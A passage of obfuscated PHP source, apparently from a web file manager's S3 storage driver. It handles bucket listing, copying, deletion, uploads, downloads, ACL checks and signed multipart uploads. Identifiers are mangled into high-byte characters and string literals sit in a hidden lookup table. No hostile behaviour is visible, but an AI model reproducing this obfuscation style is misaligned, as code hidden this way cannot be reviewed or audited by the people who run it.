$Ü¶ø¤‹Œ[$Ø—¤±î˜[83]]); $·¥ş„æÓ = array_to_keyvalue($Ü¶ø¤‹Œ, $Ø—¤±î˜[12], $Ø—¤±î˜[32]); $«Õ™äİ› = $Ø—¤±î˜[10] . get_path_ext($ÎÄÎ£™¦); $«Õ™äİ› = $«Õ™äİ› == $Ø—¤±î˜[10] || $¥Á·õÖÎ ? $Ø—¤±î˜[12] : $«Õ™äİ›; $“àÔ¯æ¸ = substr($ÎÄÎ£™¦, 0, strlen($ÎÄÎ£™¦) - strlen($«Õ™äİ›)); $ŸÃ´ÃñÅ = $“àÔ¯æ¸ . "\x28\60\x29{$«Õ™äİ›}"; for ($ª“ÉªõØ = 1; $ª“ÉªõØ <= count($·¥ş„æÓ) + 1; $ª“ÉªõØ++) { $ŸÃ´ÃñÅ = $“àÔ¯æ¸ . "\x28{$ª“ÉªõØ}\x29{$«Õ™äİ›}"; if (!in_array_not_case($ŸÃ´ÃñÅ, $·¥ş„æÓ)) { return $ŸÃ´ÃñÅ; } } return $ŸÃ´ÃñÅ; } public function listAllFiles($‰¢¬ûø†, $ÄŞ”Å¤¼, $¯ôìéüÂ = array()) { $“…ÍäôŒ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($ÄŞ”Å¤¼)) { return array(); } $ÆôªÄ“è = array(); $‰¢¬ûø† = trim($‰¢¬ûø†, $“…ÍäôŒ[8]); foreach ($ÄŞ”Å¤¼ as $œ¶ù¸Ã„) { $œˆÕ‡Ù¤ = ltrim(substr(trim($œ¶ù¸Ã„, $“…ÍäôŒ[8]), strlen($‰¢¬ûø†)), $“…ÍäôŒ[8]); $ÆôªÄ“è = array_merge($ÆôªÄ“è, $this->slicePath($œˆÕ‡Ù¤)); } $«ášÅö´ = array(); foreach (array_unique($ÆôªÄ“è) as $œ¶ù¸Ã„) { $øÃÀş = array($“…ÍäôŒ[84] => $this->getPathOuter($“…ÍäôŒ[8] . $‰¢¬ûø† . $“…ÍäôŒ[8] . $œ¶ù¸Ã„), $“…ÍäôŒ[75] => 1, $“…ÍäôŒ[76] => 0); if (substr($œ¶ù¸Ã„, -1) != $“…ÍäôŒ[8]) { $øÃÀş[$“…ÍäôŒ[75]] = 0; $Ò€³È½³ = $this->getPath($‰¢¬ûø† . $“…ÍäôŒ[8] . $œ¶ù¸Ã„); $øÃÀş[$“…ÍäôŒ[76]] = isset($¯ôìéüÂ[$Ò€³È½³]) ? $¯ôìéüÂ[$Ò€³È½³] : $this->size($Ò€³È½³); } $«ášÅö´[] = $øÃÀş; } return $«ášÅö´; } public function slicePath($ô¦ ´­Î) { $ø­å›üÂ =& $_SERVER[ĞÆÏ¡Îª]; $¢•Ÿê«» = explode($ø­å›üÂ[8], trim($ô¦ ´­Î, $ø­å›üÂ[8])); $éêéØºÓ = 0; do { ++$éêéØºÓ; $æŞÎÎç[] = implode($ø­å›üÂ[8], array_slice($¢•Ÿê«», 0, $éêéØºÓ)) . $ø­å›üÂ[8]; } while ($éêéØºÓ < count($¢•Ÿê«»)); $æŞÎÎç[count($¢•Ÿê«») - 1] = $ô¦ ´­Î; return $æŞÎÎç; } public function getHost() { $ò£ª»Øú =& $_SERVER[ĞÆÏ¡Îª]; $ä…¡‰† = parse_url(trim($this->domain, $ò£ª»Øú[8])); $ö½ ‹âÅ = isset($ä…¡‰†[$ò£ª»Øú[180]]) ? $ä…¡‰†[$ò£ª»Øú[180]] : http_type(); $«µøÁ¹¸ = isset($ä…¡‰†[$ò£ª»Øú[181]]) ? $ä…¡‰†[$ò£ª»Øú[181]] : $ä…¡‰†[$ò£ª»Øú[84]]; if (isset($ä…¡‰†[$ò£ª»Øú[182]])) { $«µøÁ¹¸ .= $ò£ª»Øú[4] . $ä…¡‰†[$ò£ª»Øú[182]]; } return $ö½ ‹âÅ . $ò£ª»Øú[183] . $«µøÁ¹¸; } public function pathEncode($ŒğÙ¹ÙÄ) { $ÉŞš§æª =& $_SERVER[ĞÆÏ¡Îª]; return str_replace($ÉŞš§æª[184], $ÉŞš§æª[8], rawurlencode($ŒğÙ¹ÙÄ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ÚêØ¦Áà) { set_timeout(); require_once SDK_DIR . $_SERVER[ĞÆÏ¡Îª][185]; parent::__construct(); $this->_init($ÚêØ¦Áà); } public function _init($Ñ©˜©ñ) { foreach ($Ñ©˜©ñ as $¹‹ç×õ‘ => $èÑÉè·”) { if (isset($this->{$¹‹ç×õ‘})) { $this->{$¹‹ç×õ‘} = $èÑÉè·”; } } $this->endpoint = $Ñ©˜©ñ[$_SERVER[ĞÆÏ¡Îª][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($îƒşÓÓ  = "\x76\64") { $this->signVer = $îƒşÓÓ ; $this->client->setSignatureVersion($îƒşÓÓ ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÕØ¾¶¢Â =& $_SERVER[ĞÆÏ¡Îª]; $õò´àÁÇ = $this->getBucketCors(); if (!$õò´àÁÇ || !is_array($õò´àÁÇ)) { return !1; } if ($õò´àÁÇ[$ÕØ¾¶¢Â[187]] != $ÕØ¾¶¢Â[188] || $õò´àÁÇ[$ÕØ¾¶¢Â[189]] != $ÕØ¾¶¢Â[188]) { return !1; } $Ó£Ü¢ßü = array_map($ÕØ¾¶¢Â[190], $õò´àÁÇ[$ÕØ¾¶¢Â[191]]); if (!is_array($Ó£Ü¢ßü)) { $Ó£Ü¢ßü = array(); } $í¬ÊÙ°³ = array($ÕØ¾¶¢Â[192], $ÕØ¾¶¢Â[193], $ÕØ¾¶¢Â[194], $ÕØ¾¶¢Â[195], $ÕØ¾¶¢Â[196]); $Ù¯İÛÍø = array_diff($í¬ÊÙ°³, $Ó£Ü¢ßü); return empty($Ù¯İÛÍø); } public function mkfile($ü‡ô¤ÁØ, $äƒàºøÔ = '', $¤±ÀÑÇ  = REPEAT_RENAME) { $Ã¨¨Éˆ± = $this->setContent($ü‡ô¤ÁØ, $äƒàºøÔ); if ($Ã¨¨Éˆ± !== !1) { return $this->getPathOuter($ü‡ô¤ÁØ); } return !1; } public function mkdir($şÆöÔŠì, $µŞ †ÊÅ = REPEAT_SKIP) { $¢½ØÃöÙ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($şÆöÔŠì) && $şÆöÔŠì !== $¢½ØÃöÙ[197]) { return !1; } if ($µŞ †ÊÅ && $this->_isFolder($şÆöÔŠì)) { return $this->getPathOuter($şÆöÔŠì); } $è©¤€‡å = $this->setContent($şÆöÔŠì, $¢½ØÃöÙ[12], !0); if ($è©¤€‡å !== !1) { return $this->getPathOuter($şÆöÔŠì); } return !1; } public function copyFile($×å£Ş±, $ÃÅºÏÏ•, $û’İÏÁŞ = array()) { $ñğ¹Ôş =& $_SERVER[ĞÆÏ¡Îª]; $œ¦ÔÄÃª = $this->objectMeta($×å£Ş±); if (!$œ¦ÔÄÃª) { return !1; } if ($œ¦ÔÄÃª[$ñğ¹Ôş[76]] <= 1024 * 1024 * 200) { $Ó¾’Î¯· = $this->client->copyObject($this->bucket, $×å£Ş±, $this->bucket, $ÃÅºÏÏ•, $ñğ¹Ôş[198], $û’İÏÁŞ); } else { $Ó¾’Î¯· = $this->client->multiCopyObject($this->bucket, $×å£Ş±, $this->bucket, $ÃÅºÏÏ•, $û’İÏÁŞ); } $Ó¾’Î¯· = $Ó¾’Î¯· ? $this->getPathOuter($ÃÅºÏÏ•) : !1; return $Ó¾’Î¯·; } public function moveFile($—şêæä§, $šõÂÛ¤) { if ($this->copyFile($—şêæä§, $šõÂÛ¤)) { $this->delFile($—şêæä§); return $this->getPathOuter($šõÂÛ¤); } return !1; } public function delFile($ã—ªÏº¨) { return $this->client->deleteObject($this->bucket, $ã—ªÏº¨); } public function delFolder($ÁŸ‹ø˜) { $§±ô¢şÚ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->exist($ÁŸ‹ø˜)) { return !0; } $this->listItemCache = !1; $ê£»™Á = $this->fileList($ÁŸ‹ø˜); $this->listItemCache = !0; $ÙŸÎ ©© = trim($ÁŸ‹ø˜, $§±ô¢şÚ[8]) . $§±ô¢şÚ[8]; if (!empty($ÁŸ‹ø˜) && $ÁŸ‹ø˜ !== $§±ô¢şÚ[197] && !in_array($ÙŸÎ ©©, $ê£»™Á[$§±ô¢şÚ[82]])) { $ê£»™Á[$§±ô¢şÚ[82]][] = $ÙŸÎ ©©; } $ğæòÊ®ß = $this->delByBatch($ê£»™Á[$§±ô¢şÚ[83]]); if (!$ğæòÊ®ß) { return !1; } $ğæòÊ®ß = $this->delByBatch($ê£»™Á[$§±ô¢şÚ[82]]); if (!$ğæòÊ®ß) { return !1; } return $this->delFile($ÙŸÎ ©©); } private function delByBatch($õâÅºÈà) { foreach (array_chunk($õâÅºÈà, 1000) as $Ã–ÓÏ²ï) { $É¥»£ñ® = $this->client->deleteObjects($this->bucket, $Ã–ÓÏ²ï); if (!$É¥»£ñ®) { return !1; } } return !0; } public function rename($ÍÙí—±‘, $ŠÊßÖºÅ) { return $this->renameObject($ÍÙí—±‘, $ŠÊßÖºÅ); } public function listPath($è¬Ûç©•, $ÏÛÃ£Ğ = false) { $Ì£ÁœÉ =& $_SERVER[ĞÆÏ¡Îª]; $¨é¦êš = $this->fileList($è¬Ûç©•, $Ì£ÁœÉ[8], !0); foreach ($¨é¦êš[$Ì£ÁœÉ[82]] as $¨ÍŞÕí => $Ÿ½Û¯ëÑ) { $¨é¦êš[$Ì£ÁœÉ[82]][$¨ÍŞÕí] = $this->folderInfo($Ÿ½Û¯ëÑ, $ÏÛÃ£Ğ, $Ÿ½Û¯ëÑ); } foreach ($¨é¦êš[$Ì£ÁœÉ[83]] as $¨ÍŞÕí => $Ÿ½Û¯ëÑ) { $¨é¦êš[$Ì£ÁœÉ[83]][$¨ÍŞÕí] = $this->fileInfo($Ÿ½Û¯ëÑ[$Ì£ÁœÉ[32]], $ÏÛÃ£Ğ, $Ÿ½Û¯ëÑ); } return $¨é¦êš; } protected function infoChildren($†ô’‘Îç, &$ŒÎñô) { $·ó³ÊÃæ =& $_SERVER[ĞÆÏ¡Îª]; $Æ´€şë‚ = $this->fileList($†ô’‘Îç, $·ó³ÊÃæ[12], !0); $ŒÎñô[$·ó³ÊÃæ[78]] += count($Æ´€şë‚[$·ó³ÊÃæ[82]]); $ŒÎñô[$·ó³ÊÃæ[77]] += count($Æ´€şë‚[$·ó³ÊÃæ[83]]); foreach ($Æ´€şë‚[$·ó³ÊÃæ[83]] as $‚«ÓÄ¶˜) { if (!$‚«ÓÄ¶˜ || !$‚«ÓÄ¶˜[$·ó³ÊÃæ[76]]) { continue; } $ŒÎñô[$·ó³ÊÃæ[76]] += $‚«ÓÄ¶˜[$·ó³ÊÃæ[76]]; } } private function fileInfo($Òêú•Èå, $àƒ¨¹ø = false, $à£ÏßŒ¡ = array()) { $ëœñë‡Ÿ =& $_SERVER[ĞÆÏ¡Îª]; $¿Å˜†ë© = array($ëœñë‡Ÿ[32] => $this->pathThis($Òêú•Èå), $ëœñë‡Ÿ[84] => $this->getPathOuter($Òêú•Èå), $ëœñë‡Ÿ[33] => $ëœñë‡Ÿ[199], $ëœñë‡Ÿ[174] => $this->ext($Òêú•Èå), $ëœñë‡Ÿ[76] => isset($à£ÏßŒ¡[$ëœñë‡Ÿ[76]]) ? $à£ÏßŒ¡[$ëœñë‡Ÿ[76]] : 0); if ($àƒ¨¹ø) { return $¿Å˜†ë©; } $¿Å˜†ë©[$ëœñë‡Ÿ[200]] = $¿Å˜†ë©[$ëœñë‡Ÿ[85]] = 0; $¿Å˜†ë©[$ëœñë‡Ÿ[201]] = $¿Å˜†ë©[$ëœñë‡Ÿ[202]] = !0; if (empty($à£ÏßŒ¡)) { $à£ÏßŒ¡ = $this->objectMeta($Òêú•Èå); if (!$à£ÏßŒ¡) { return $¿Å˜†ë©; } } if (isset($à£ÏßŒ¡[$ëœñë‡Ÿ[203]])) { $¿Å˜†ë©[$ëœñë‡Ÿ[85]] = $à£ÏßŒ¡[$ëœñë‡Ÿ[203]]; } if (isset($à£ÏßŒ¡[$ëœñë‡Ÿ[76]])) { $¿Å˜†ë©[$ëœñë‡Ÿ[76]] = $à£ÏßŒ¡[$ëœñë‡Ÿ[76]]; } return $¿Å˜†ë©; } private function folderInfo($òşÂ€—·, $ÏÅûŒ’² = false, $ìÔÑºğ« = array()) { $½Ò„äì =& $_SERVER[ĞÆÏ¡Îª]; $Ëü°²êí = array($½Ò„äì[32] => $this->pathThis($òşÂ€—·), $½Ò„äì[84] => $this->getPathOuter($½Ò„äì[8] . $òşÂ€—·), $½Ò„äì[33] => $½Ò„äì[75]); if ($ÏÅûŒ’²) { return $Ëü°²êí; } $Ëü°²êí[$½Ò„äì[200]] = $Ëü°²êí[$½Ò„äì[85]] = 0; $Ëü°²êí[$½Ò„äì[201]] = $Ëü°²êí[$½Ò„äì[202]] = !0; if ($òşÂ€—· == $½Ò„äì[12]) { return $Ëü°²êí; } if (empty($ìÔÑºğ«)) { $ìÔÑºğ« = $this->objectMeta(trim($òşÂ€—·, $½Ò„äì[8]) . $½Ò„äì[8]); } if (isset($ìÔÑºğ«[$½Ò„äì[203]])) { $Ëü°²êí[$½Ò„äì[200]] = $ìÔÑºğ«[$½Ò„äì[203]]; } return $Ëü°²êí; } private function fileList($æÆ«İµç, $Çä»„øÎ = '', $Ù·ö—ö = 0) { $¾çöäŒ =& $_SERVER[ĞÆÏ¡Îª]; $Ëº›œ¤› = rtrim($æÆ«İµç, $¾çöäŒ[8]) . $¾çöäŒ[8]; $ËÙÛü„ = $this->listObjs($Ëº›œ¤›, null, null, $Çä»„øÎ); if (!$ËÙÛü„) { return array($¾çöäŒ[82] => array(), $¾çöäŒ[83] => array()); } $êßÉÅ» = $Èèñì ‰ = array(); foreach ($ËÙÛü„[$¾çöäŒ[204]] as $¥šÒû) { $Á³¡­Àß = $¥šÒû[$¾çöäŒ[32]]; if ($Á³¡­Àß == $Ëº›œ¤›) { continue; } $©ŠÊÂÀ® = isset($¥šÒû[$¾çöäŒ[76]]) ? $¥šÒû[$¾çöäŒ[76]] : 0; $Ä’÷µú– = $©ŠÊÂÀ® == 0 && substr($Á³¡­Àß, strlen($Á³¡­Àß) - 1, 1) == $¾çöäŒ[8] ? !0 : !1; $this->cacheMethodInfoSet($Á³¡­Àß, $Ä’÷µú–, $¥šÒû); if ($Ä’÷µú–) { $êßÉÅ»[] = $Á³¡­Àß; continue; } $Èèñì ‰[] = $Ù·ö—ö ? $¥šÒû : $Á³¡­Àß; } foreach ($ËÙÛü„[$¾çöäŒ[205]] as $¥šÒû) { $êßÉÅ»[] = $¥šÒû[$¾çöäŒ[32]]; $this->cacheMethodInfoSet($¥šÒû[$¾çöäŒ[32]], !0); } $this->cacheMethodInfoSet($æÆ«İµç, !0); return array($¾çöäŒ[82] => $êßÉÅ», $¾çöäŒ[83] => $Èèñì ‰); } private function listObjs($”Ãõª•ˆ, $Ãƒ¢á°¥ = null, $›òÆ—äÕ = null, $Üáü´¯ = null) { $øÑÆÙÚú =& $_SERVER[ĞÆÏ¡Îª]; $”Ãõª•ˆ = trim($”Ãõª•ˆ, $øÑÆÙÚú[8]); $ÓÃ²¢ = empty($”Ãõª•ˆ) && $”Ãõª•ˆ !== $øÑÆÙÚú[197] ? $øÑÆÙÚú[12] : $”Ãõª•ˆ . $øÑÆÙÚú[8]; return $this->client->getBucket($this->bucket, $ÓÃ²¢, $Ãƒ¢á°¥, $›òÆ—äÕ, $Üáü´¯, !0); } public function has($òïÌ, $³«²Ğé = false, $¨—şÈ¬‚ = true) { $Â¡şñ« =& $_SERVER[ĞÆÏ¡Îª]; $òïÌ = trim($òïÌ, $Â¡şñ«[8]); $çåÊ«‘Œ = empty($òïÌ) && $òïÌ !== $Â¡şñ«[197] ? $Â¡şñ«[12] : $òïÌ . $Â¡şñ«[8]; $ÅşŒş = null; $—Ã¬êªÙ = 500; $à‡Ü€òŸ = $Â¡şñ«[8]; $ûì“æ‡û = $Ø·ƒ˜á = array(); while (!0) { $”ûßñÍê = $this->listObjs($òïÌ, $ÅşŒş, $—Ã¬êªÙ, $à‡Ü€òŸ); if (!$”ûßñÍê) { break; } $ÅşŒş = $”ûßñÍê[$Â¡şñ«[206]]; $¤¬¢àêò = $”ûßñÍê[$Â¡şñ«[204]]; $­°©‰àŠ = $”ûßñÍê[$Â¡şñ«[205]]; if (empty($¤¬¢àêò) && empty($­°©‰àŠ)) { break; } if (count($¤¬¢àêò) == 1 && $¤¬¢àêò[0][$Â¡şñ«[32]] == $çåÊ«‘Œ) { break; } if ($³«²Ğé) { if (count($¤¬¢àêò)) { $¤¬¢àêò = array_column($¤¬¢àêò, $Â¡şñ«[32]); $ûì“æ‡û = array_merge($ûì“æ‡û, $¤¬¢àêò); } if (count($­°©‰àŠ)) { $­°©‰àŠ = array_column($­°©‰àŠ, $Â¡şñ«[32]); $Ø·ƒ˜á = array_merge($Ø·ƒ˜á, $­°©‰àŠ); } if ($ÅşŒş === null) { break; } continue; } if ($¨—şÈ¬‚) { if (!empty($¤¬¢àêò)) { if (count($¤¬¢àêò) > 1 || isset($¤¬¢àêò[0][$Â¡şñ«[32]]) && $¤¬¢àêò[0][$Â¡şñ«[32]] != $çåÊ«‘Œ) { return !0; } } } else { if (!empty($­°©‰àŠ)) { return !0; } } if ($ÅşŒş === null) { break; } } if ($³«²Ğé) { $ûì“æ‡û = array_diff($ûì“æ‡û, array($çåÊ«‘Œ)); $ûì“æ‡û = count(array_unique($ûì“æ‡û)); $Ø·ƒ˜á = count(array_unique($Ø·ƒ˜á)); return array($Â¡şñ«[207] => $ûì“æ‡û, $Â¡şñ«[208] => $Ø·ƒ˜á); } return !1; } public function listAll($ÏğÁ¸€ã) { $ŞüÉúßó =& $_SERVER[ĞÆÏ¡Îª]; $ÄıÇÚšù = $this->fileList($ÏğÁ¸€ã, $ŞüÉúßó[12], !0); $Ñ½ôÑ = array(); foreach ($ÄıÇÚšù[$ŞüÉúßó[83]] as $´—¸êšÀ) { $Ñ½ôÑ[$´—¸êšÀ[$ŞüÉúßó[32]]] = $´—¸êšÀ[$ŞüÉúßó[76]]; } foreach ($ÄıÇÚšù[$ŞüÉúßó[82]] as $´—¸êšÀ) { if (is_string($´—¸êšÀ)) { $Ñ½ôÑ[$´—¸êšÀ] = 0; } } return $this->listAllFiles($ÏğÁ¸€ã, array_keys($Ñ½ôÑ), $Ñ½ôÑ); } public function canRead($èô—Ş¶ñ) { $Ìİ†Éù =& $_SERVER[ĞÆÏ¡Îª]; $ûµ©È‘š = $this->client->getAccessControlPolicy($this->bucket, $èô—Ş¶ñ); if (!$ûµ©È‘š) { return !1; } return in_array($ûµ©È‘š, array($Ìİ†Éù[209], $Ìİ†Éù[210], $Ìİ†Éù[211])) ? !0 : !1; } public function canWrite($èÒ°÷°) { $ØÈâµö· =& $_SERVER[ĞÆÏ¡Îª]; $¶µğŸ³ö = $this->client->getAccessControlPolicy($this->bucket, $èÒ°÷°); if (!$¶µğŸ³ö) { return !1; } return in_array($¶µğŸ³ö, array($ØÈâµö·[209], $ØÈâµö·[210])) ? !0 : !1; } public function getContent($±Îù¤ª) { return $this->client->getObject($this->bucket, $±Îù¤ª); } public function setContent($”ŞØê¨®, $Øü¥Èüå = '', $†–™†‚› = false) { $ßù§€ï =& $_SERVER[ĞÆÏ¡Îª]; $”ŞØê¨® = $†–™†‚› ? trim($”ŞØê¨®, $ßù§€ï[8]) . $ßù§€ï[8] : $”ŞØê¨®; $ÔœÒ§òµ = get_file_mime(get_path_ext($”ŞØê¨®)); $Â—Ñ· = $this->client->putObject($Øü¥Èüå, $this->bucket, $”ŞØê¨®, $ßù§€ï[198], array(), $ÔœÒ§òµ); if (!$Â—Ñ·) { return !1; } if ($†–™†‚›) { return !0; } $this->cacheMethod(null, null); $Â—Ñ· = $this->copyFile($”ŞØê¨®, $”ŞØê¨®, array($ßù§€ï[212] => $Â—Ñ·[$ßù§€ï[213]])); return $Â—Ñ· ? !0 : !1; } public function fileSubstr($Êæ£ƒ¬, $•ŒÛÄ», $Ë¬Ê¹´) { $ûÃğõë = $•ŒÛÄ» + $Ë¬Ê¹´ - 1; return $this->client->getObject($this->bucket, $Êæ£ƒ¬, array($_SERVER[ĞÆÏ¡Îª][214] => "\x62\x79\164\145\x73\x3d{$•ŒÛÄ»}\55{$ûÃğõë}")); } public function upload($Ï‡²”ì, $—³‘©©, $©ôòàŒ¢ = false, $Ÿ–Å™¥Ø = REPEAT_REPLACE) { $¶…Ò¬Œ¥ =& $_SERVER[ĞÆÏ¡Îª]; $†Ù®š¦ = array($¶…Ò¬Œ¥[212] => @md5_file($—³‘©©)); $ô¸¿óš = array($¶…Ò¬Œ¥[215] => get_file_mime(get_path_ext($Ï‡²”ì))); if (IO::size($—³‘©©) <= 1024 * 1024 * 200) { $æ¼íÚ‘Ş = $this->client->putObjectFile($—³‘©©, $this->bucket, $Ï‡²”ì, $¶…Ò¬Œ¥[198], $†Ù®š¦, $ô¸¿óš); return !empty($æ¼íÚ‘Ş) ? $this->getPathOuter($Ï‡²”ì) : !1; } $ç«ËÅ·Ã = $this->client->multiUploadObject($—³‘©©, $this->bucket, trim($Ï‡²”ì, $¶…Ò¬Œ¥[8]), $†Ù®š¦, $ô¸¿óš); return $ç«ËÅ·Ã ? $this->getPathOuter($Ï‡²”ì) : !1; } public function download($ñ‰§•¤¿, $åş¶¥¸Ñ) { if (!@is_dir($this->pathFather($åş¶¥¸Ñ)) && !IO::mkdir($this->pathFather($åş¶¥¸Ñ))) { return !1; } $ÎœÏ­›Â = $this->client->getObject($this->bucket, $ñ‰§•¤¿, array(), $åş¶¥¸Ñ); return $ÎœÏ­›Â !== !1 ? $åş¶¥¸Ñ : !1; } public function link($ÑÓæµ ™, $¤—»ƒ¾Í = array()) { $øÄİÂ²€ =& $_SERVER[ĞÆÏ¡Îª]; if ($this->signVer == $øÄİÂ²€[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÑÓæµ ™, 3600 * 12, $¤—»ƒ¾Í); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÑÓæµ ™, $øÄİÂ²€[8]), 3600 * 12, $this->region, array(), !0, $¤—»ƒ¾Í); } public function fileOut($ÏŠîªö¸, $Ö‰ĞªÇç = false, $İüØ‚ŞÅ = false, $Ú‰¼¤¿Î = '') { $åğïãâô =& $_SERVER[ĞÆÏ¡Îª]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÏŠîªö¸, $Ö‰ĞªÇç, $İüØ‚ŞÅ, $Ú‰¼¤¿Î); } if (!$İüØ‚ŞÅ) { $İüØ‚ŞÅ = $this->pathThis($ÏŠîªö¸); } $ÁÓô¡Õá = get_file_mime(get_path_ext($İüØ‚ŞÅ)); if ($ÁÓô¡Õá == $åğïãâô[217]) { return parent::fileOut($ÏŠîªö¸, $Ö‰ĞªÇç, $İüØ‚ŞÅ, $Ú‰¼¤¿Î); } $èè¯ñË§ = array($åğïãâô[218] => $ÁÓô¡Õá); if ($Ö‰ĞªÇç) { $èè¯ñË§[$åğïãâô[219]] = $åğïãâô[220] . rawurlencode($İüØ‚ŞÅ); } else { } $²û­ÈÈÚ = $this->link($ÏŠîªö¸, $èè¯ñË§); $this->fileOutLink($²û­ÈÈÚ); } public function fileOutServer($€ä¸¼£, $õ‰…§Ó = false, $¼ÆÜ÷®¨ = false, $Õà¢Ó±í = '') { parent::fileOut($€ä¸¼£, $õ‰…§Ó, $¼ÆÜ÷®¨, $Õà¢Ó±í); } public function fileOutImageServer($Æıí³§³, $„Ô·¬ñ³ = 250) { parent::fileOutImage($Æıí³§³, $„Ô·¬ñ³); } public function hashMd5($óâ˜½¡, $ÇÊ“£ıé = '') { $Ò¡›öÀ =& $_SERVER[ĞÆÏ¡Îª]; $Û¹í…ĞÒ = $this->objectMeta($óâ˜½¡); if (!$Û¹í…ĞÒ) { return !1; } $ÇÊ“£ıé = $ÇÊ“£ıé ? $ÇÊ“£ıé : _get($Û¹í…ĞÒ, $Ò¡›öÀ[221]); $ÇÊ“£ıé = $ÇÊ“£ıé ? $ÇÊ“£ıé : _get($Û¹í…ĞÒ, $Ò¡›öÀ[213], $Ò¡›öÀ[12]); return $ÇÊ“£ıé; } public function uploadFormData($Ô”©ÚÎ, $æ•Óû’¹ = 3600) { $¦Øª››› =& $_SERVER[ĞÆÏ¡Îª]; $™ÓÎô± = $this->pathFather($Ô”©ÚÎ); $®ÃàÏúÆ = $this->client->getHttpUploadPostParams($this->bucket, $™ÓÎô±, $¦Øª›››[198], $æ•Óû’¹); return array_merge((array) $®ÃàÏúÆ, array($¦Øª›››[181] => $this->getHost())); } public function multiUploadFormData($øÉúÇ²Ò, $ÈÒ©¥Şœ = 3600) { $´êš±Æë =& $_SERVER[ĞÆÏ¡Îª]; $©¿ŒÆÌ„ = gmdate($´êš±Æë[222]); $¥Â£ÔèÏ = array(); $½ÆÕ ğÆ = $this->client->getUploadId($this->bucket, $øÉúÇ²Ò, $¥Â£ÔèÏ); if (!$½ÆÕ ğÆ) { return !1; } return array($´êš±Æë[223] => $½ÆÕ ğÆ, $´êš±Æë[181] => $this->getHost() . $´êš±Æë[8] . $this->pathEncode($øÉúÇ²Ò), $´êš±Æë[224] => $©¿ŒÆÌ„, $´êš±Æë[94] => $øÉúÇ²Ò); } public function multiUploadAuthData($Ï÷î›ÖÑ, $İ¿¸û· = array()) { $¡¢ÑãøŞ =& $_SERVER[ĞÆÏ¡Îª]; $ ¨Úƒï° = isset($İ¿¸û·[$¡¢ÑãøŞ[224]]) ? $İ¿¸û·[$¡¢ÑãøŞ[224]] : gmdate($¡¢ÑãøŞ[222]); $¥¼ƒ¢½ = isset($İ¿¸û·[$¡¢ÑãøŞ[174]]) ? $İ¿¸û·[$¡¢ÑãøŞ[174]] : $¡¢ÑãøŞ[12]; $ñíˆœ³¾ = $İ¿¸û·[$¡¢ÑãøŞ[94]]; unset($İ¿¸û·[$¡¢ÑãøŞ[94]]); if (isset($İ¿¸û·[$¡¢ÑãøŞ[225]])) { $İ¿¸û·[$¡¢ÑãøŞ[224]] = $ ¨Úƒï°; return $this->listUploadParts($ñíˆœ³¾, $İ¿¸û·); } $È¥¶èâÅ = array($¡¢ÑãøŞ[226], $¡¢ÑãøŞ[12], $¡¢ÑãøŞ[120], $¡¢ÑãøŞ[12], "\170\x2d\x61\155\172\55\144\141\x74\x65\x3a{$ ¨Úƒï°}", $¡¢ÑãøŞ[8] . $this->bucket . $¡¢ÑãøŞ[8] . $this->pathEncode($ñíˆœ³¾) . $¥¼ƒ¢½); if (strpos($¥¼ƒ¢½, $¡¢ÑãøŞ[227]) === 0) { $È¥¶èâÅ[0] = $¡¢ÑãøŞ[228]; } if (isset($İ¿¸û·[$¡¢ÑãøŞ[229]]) && $İ¿¸û·[$¡¢ÑãøŞ[229]] == $¡¢ÑãøŞ[230]) { $È¥¶èâÅ[0] = $¡¢ÑãøŞ[230]; } $Â÷…ë˜ = implode($¡¢ÑãøŞ[231], $È¥¶èâÅ); $•Íı±§Î = base64_encode(hash_hmac($¡¢ÑãøŞ[232], $Â÷…ë˜, $this->secret, !0)); $¤®†ªœë = $¡¢ÑãøŞ[233] . $this->accessKey . $¡¢ÑãøŞ[4] . $•Íı±§Î; if (strpos($¥¼ƒ¢½, $¡¢ÑãøŞ[227]) === 0) { return array($¡¢ÑãøŞ[234] => $¤®†ªœë, $¡¢ÑãøŞ[224] => $ ¨Úƒï°); } return $¤®†ªœë; } public function listUploadParts($•¼ĞÏù, $Ï¬Áòş¶ = array()) { $İøëò¿Â =& $_SERVER[ĞÆÏ¡Îª]; $ä§–œó = str_replace($İøëò¿Â[235], $İøëò¿Â[12], $Ï¬Áòş¶[$İøëò¿Â[174]]); $²é©µ¹ğ = $this->client->listParts($this->bucket, $•¼ĞÏù, $ä§–œó); if (!$²é©µ¹ğ) { return !1; } unset($Ï¬Áòş¶[$İøëò¿Â[225]], $Ï¬Áòş¶[$İøëò¿Â[229]]); $Ï¬Áòş¶[$İøëò¿Â[94]] = $•¼ĞÏù; $´µ¢àõ = $this->multiUploadAuthData($•¼ĞÏù, $Ï¬Áòş¶); if (empty($´µ¢àõ)) { return !1; } return array($İøëò¿Â[234] => $´µ¢àõ, $İøëò¿Â[224] => $Ï¬Áòş¶[$İøëò¿Â[224]], $İøëò¿Â[236] => $²é©µ¹ğ); } public function getHost() { return parent::getHost() . $_SERVER[ĞÆÏ¡Îª][8] . $this->bucket; } public function size($ĞÈ“ÓÙ¥) { $íØñ†ãŠ = $this->objectMeta($ĞÈ“ÓÙ¥); return $íØñ†ãŠ ? $íØñ†ãŠ[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function info($ã÷ıêİæ) { if ($this->isFolder($ã÷ıêİæ)) { return $this->folderInfo($ã÷ıêİæ); } else { if ($this->isFile($ã÷ıêİæ)) { return $this->fileInfo($ã÷ıêİæ); } } return !1; } public function exist($ŒËœõı) { return $this->isFile($ŒËœõı) || $this->isFolder($ŒËœõı); } public function isFile($£‡«¿òÂ) { return !$this->isFolder($£‡«¿òÂ) && $this->objectMeta($£‡«¿òÂ); } public function isFolder($Ÿ‹ÈÔò) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][165], 